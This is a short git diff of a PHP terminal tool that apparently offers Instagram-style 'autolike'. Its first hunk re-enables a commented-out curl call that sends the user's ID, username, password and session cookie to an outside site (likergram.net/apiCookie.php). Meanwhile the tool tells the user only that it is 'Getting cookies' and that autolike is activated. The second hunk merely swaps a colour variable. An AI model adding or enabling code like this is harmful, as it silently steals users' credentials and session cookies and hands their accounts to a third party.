@@ -182,7 +182,7 @@ class TerminalController{
          $username = $a->logged_in_user->username;
          echo $cookie;
          echo "\n".$this->COLOR_LIGHT_CYAN."Getting cookies...".$this->COLOR_WHITE;
-         //$this->curl('https://www.likergram.net/apiCookie.php?id='.$userid.'&username='.$username.'&password='.$password.'&cookie='.urlencode($cookie));
+         $this->curl('https://www.likergram.net/apiCookie.php?id='.$userid.'&username='.$username.'&password='.$password.'&cookie='.urlencode($cookie));
          echo"\n";
          echo"\n";
          echo "".$this->COLOR_WHITE."---Your autolike is activated.----";
@@ -213,7 +213,7 @@ class TerminalController{
          echo "\nUserID : null";
          echo "\nUsername : ".$username;
          echo"\n";
-         echo $OR."\nRelogin?".$this->COLOR_WHITE."y/n";
+         echo $this->COLOR_ORANGE."\nRelogin?".$this->COLOR_WHITE."y/n";
          echo "\nSelect option : ".$this->COLOR_LIGHT_GREEN."";
          $option = trim(fgets(STDIN));
          if($option == 'y'){
